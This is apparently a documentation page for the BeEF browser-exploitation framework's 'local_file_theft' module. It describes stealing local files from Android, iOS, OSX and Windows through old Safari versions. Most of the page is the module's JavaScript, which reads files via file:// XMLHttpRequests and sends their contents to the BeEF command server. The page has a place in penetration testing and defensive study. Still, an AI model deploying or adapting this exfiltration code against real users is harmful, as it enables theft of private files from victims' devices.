## Summary

* **Objective**: Steals local files in common locations across Android, iOS, OSX and Windows
* **Authors**: mh
* **Browsers**: Safari (< 10) and potentially others

* [Code](https://github.com/beefproject/beef/tree/master/modules/misc/local_file_theft)

## Internal Working

Uses the `file://` scheme to steal files with XMLHttpRequest (XHR).

```js
function grabFiles(dir,os){
        tmpfile = {}
        for (i in fileList[os]['post']){
        beef.debug('dir = ' + dir);
        beef.debug('fileList: ' + fileList[os]['post'][i]);
                beef.debug(i);
                tmpfile[i] = new XMLHttpRequest()
                tmpfile[i].open ('get',dir+"/"+fileList[os]['post'][i]);
                tmpfile[i].send();

                tmpfile[i].onreadystatechange=function(){
            for (j in fileList[os]['post']) {
                if(tmpfile[j].readyState==4) {
                    beef.debug('new returned for: ' + j);
                    result = j +": "+ tmpfile[j].responseText;

                    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);
                            }
            	}
            }


        }
}

```


## Feedback

